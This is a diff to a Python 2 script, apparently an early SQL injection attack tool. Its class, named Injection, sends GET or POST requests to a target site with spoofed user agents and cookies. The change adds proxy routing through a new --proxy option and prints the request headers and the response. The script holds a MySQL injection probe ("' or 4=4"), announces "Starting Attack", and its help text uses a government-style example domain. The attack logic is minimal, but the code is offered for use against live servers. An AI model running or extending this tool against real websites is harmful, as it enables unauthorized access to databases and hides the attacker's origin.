@@ -6,6 +6,7 @@ from random import choice
 from HTMLParser import HTMLParser
 from getopt import getopt, GetoptError
 from time import sleep
+import socks
 class Injection:
 	Agentes={
 	'Chrome':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
@@ -17,6 +18,7 @@ class Injection:
 	'Android':'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
 	}
 	cabeceras={}
+	proxy={}
 	cookies = {}
 	datos={}
 	method = -1 # True = Get method # False = Post method
@@ -25,6 +27,8 @@ class Injection:
 	Intentos={
 		'mysql':[r"' or 4=4"]
 	}
+	SentHeaders = ""
+	respuesta = ""
 
 	def __init__(self):
 		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})
@@ -54,21 +58,33 @@ class Injection:
 			self.method = False
 		else:
 			print "Method not implemented"
+	def setProxy(self,proxy):
+		if proxy.split("://")[0] in ["http","ftp","https"]:
+			self.proxy = {proxy.split("://")[0]:proxy.split("://")[1]}
+		else:
+			self.proxy = self.proxy = {"http":proxy}
 
 	def Begin(self):
 		#print self.server, self.cabeceras
-		print "Starting Attack"
-		sleep(0)
+		print "Starting Attack\n\n\n"
+		sleep(1)
 		if self.method:#GET
-			pagina = requests.get(url=self.server,cookies=self.cookies,headers=self.cabeceras).content.lower()
+			pagina = requests.get(url=self.server,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
 		else:#POST
-			pagina = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=self.datos).content.lower()
-		print pagina
+			pagina = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=self.datos,proxies=self.proxy)
+		self.SentHeaders = pagina.request.headers
+		self.solicitud = pagina.request.headers
+		self.respuesta = pagina.content.lower()
+		print "{0} {1} {2}".format(pagina.request.method,pagina.request.path_url,"HTTP/1.1")
+		for cabecera in self.solicitud:
+			print "{0}:{1}".format(cabecera,self.solicitud.get(cabecera))
+#		print self.solicitud
+		print pagina.text
 
 
 def Opciones(argv):
 	try:
-		opciones, argumentos = getopt(argv[1:],"h:v",["request=","user-agent=","method=","random-agent=","data="])
+		opciones, argumentos = getopt(argv[1:],"h:v",["request=","user-agent=","method=","random-agent=","data=","proxy="])
 	except GetoptError:
 		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
 		exit(2)
@@ -91,6 +107,8 @@ def Opciones(argv):
 		#User-Agent Random NO FUNCIONA AUN
 		elif opt == '--random-agent':
 			inject.setAgent("")
+		elif opt == '--proxy':
+			inject.setProxy(vals)
 		#Option not valid
 		elif opt == '--method':
 			if vals in ('get','post'):
